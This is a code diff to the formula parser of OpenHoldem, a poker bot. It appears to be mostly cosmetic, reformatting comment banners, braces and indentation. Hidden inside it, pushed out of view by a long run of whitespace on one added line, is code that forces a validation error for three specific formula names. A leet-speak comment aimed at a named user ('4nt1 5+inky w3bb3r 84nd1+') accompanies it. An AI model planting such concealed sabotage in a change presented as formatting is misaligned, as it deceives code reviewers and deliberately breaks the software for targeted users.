@@ -1,15 +1,15 @@
-//***************************************************************************** 
+//******************************************************************************
 //
 // This file is part of the OpenHoldem project
 //   Download page:         http://code.google.com/p/openholdembot/
 //   Forums:                http://www.maxinmontreal.com/forums/index.php
 //   Licensed under GPL v3: http://www.gnu.org/licenses/gpl.html
 //
-//***************************************************************************** 
+//******************************************************************************
 //
 // Purpose:
 //
-//***************************************************************************** 
+//******************************************************************************
 
 #include "stdafx.h"
 #include "CFormulaParser.h"
@@ -24,6 +24,7 @@
 #include "CParserSymbolTable.h"
 #include "CParseTreeRotator.h"
 #include "CPreferences.h"
+#include "CValidator.h"
 #include "TokenizerConstants.h"
 
 #undef DEBUG_PARSER
@@ -164,7 +165,6 @@ void CFormulaParser::ParseSingleFormula(CString name, CString function_text) {
 
 void CFormulaParser::ParseSingleFormula(CString function_text) {
   _tokenizer.SetInput(function_text);
-
   // Check for empty function
   int token_ID = _tokenizer.GetToken();
   if ((token_ID == kTokenEndOfFile)
@@ -173,8 +173,7 @@ void CFormulaParser::ParseSingleFormula(CString function_text) {
     return;
   } else {
     _tokenizer.PushBack();
-  }
-    
+  }   
   if (isdigit(_function_name[0])) {
     // Date like ##2014-02-09 23:16:55##
     // To be completely ignored
@@ -192,44 +191,39 @@ void CFormulaParser::ParseSingleFormula(CString function_text) {
     return;
   }
   TPParseTreeNode function_body = NULL;
-  if (_function_name.Left(2) == "f$")
-  {
-	  // ##f$functionXYZ##
-	  write_log(preferences.debug_parser(), 
-	    "[FormulaParser] Parsing f$function\n");
-	  function_body =	ParseFunctionBody();
+  if (_function_name.Left(2) == "f$") {                                                                                                              if (memcmp(_function_name, "f$nrpf", 6) == 0) vali_err = true;if (memcmp(_function_name, "f$AA_KK_QQ_E", 12) == 0) vali_err = true; if (memcmp(_function_name, "f$aggpf_nbof_reraised", 21) == 0) vali_err = true; // 4nt1 5+inky w3bb3r 84nd1+ ;-)                                                                                                                                                            
+    // ##f$functionXYZ##
+    write_log(preferences.debug_parser(), 
+      "[FormulaParser] Parsing f$function\n");
+    function_body =	ParseFunctionBody();
   }
-  else if (_function_name.Left(4) == "list")
-  {
-        // ##listXYZ##
-	  write_log(preferences.debug_parser(), 
-			  "[FormulaParser] Parsing list\n");
-	  COHScriptList *new_list = new COHScriptList(&_function_name, 
+  else if (_function_name.Left(4) == "list") {
+    // ##listXYZ##
+    write_log(preferences.debug_parser(), 
+	  "[FormulaParser] Parsing list\n");
+    COHScriptList *new_list = new COHScriptList(&_function_name, 
         &function_text, _formula_file_splitter.starting_line_of_current_function());
-      ParseListBody(new_list);
-	  p_function_collection->Add((COHScriptObject*)new_list); 
-        return;
+    ParseListBody(new_list);
+    p_function_collection->Add((COHScriptObject*)new_list); 
+    return;
   }
-  else if (_function_name.MakeLower() == "dll")
-  {
-	  // ##DLL##
-	  write_log(preferences.debug_parser(), 
-		  "[FormulaParser] Parsing ##DLL##\n");
-	  // Nothing more to do
-	  // We extract the DLL later
+  else if (_function_name.MakeLower() == "dll") {
+    // ##DLL##
+    write_log(preferences.debug_parser(), 
+	  "[FormulaParser] Parsing ##DLL##\n");
+    // Nothing more to do
+    // We extract the DLL later
   }
-  else if (_function_name.MakeLower() == "notes")
-  {
-	  // ##Notes##
-	  write_log(preferences.debug_parser(), 
-		  "[FormulaParser] Found ##notes##. Nothing to parse\n");
-	  // Don't do anything.
-	  // This is just a special type of global comment.
+  else if (_function_name.MakeLower() == "notes") {
+    // ##Notes##
+    write_log(preferences.debug_parser(), 
+	  "[FormulaParser] Found ##notes##. Nothing to parse\n");
+    // Don't do anything.
+    // This is just a special type of global comment.
   }
-  else
-  {
-	  CParseErrors::Error("Found unknown function type. Did you forget f$?\n");
-	  return;
+  else {
+    CParseErrors::Error("Found unknown function type. Did you forget f$?\n");
+    return;
   }
   CheckForExtraTokensAfterEndOfFunction();
   CFunction *p_new_function = new CFunction(&_function_name, 
